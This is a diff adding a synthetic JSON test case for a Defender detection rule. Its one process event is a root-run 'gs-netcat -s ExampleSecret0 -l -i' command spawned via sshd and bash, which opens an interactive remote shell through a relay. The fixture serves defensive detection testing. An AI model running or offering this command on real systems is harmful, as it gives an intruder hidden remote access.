@@ -1,0 +1,24 @@
+{
+  "label": "malicious",
+  "variant": "gs-netcat started with a secret on the command line (README usage)",
+  "synthetic": true,
+  "source": "synthetic; https://github.com/hackerschoice/gsocket/blob/master/README.md",
+  "platform": "defender",
+  "table": "DeviceProcessEvents",
+  "expect_alert": true,
+  "result": "not run (no LogScale or Advanced Hunting runner). Regex-level Python check of the rule's patterns: would alert, matches expectation",
+  "events": [
+    {
+      "Timestamp": "2026-11-10T13:10:00Z",
+      "DeviceId": "synthetic-device-0001",
+      "DeviceName": "web1.example.invalid",
+      "AccountName": "root",
+      "FileName": "gs-netcat",
+      "FolderPath": "/usr/local/bin/gs-netcat",
+      "ProcessCommandLine": "gs-netcat -s ExampleSecret0 -l -i",
+      "InitiatingProcessFileName": "bash",
+      "InitiatingProcessCommandLine": "bash",
+      "InitiatingProcessParentFileName": "sshd"
+    }
+  ]
+}
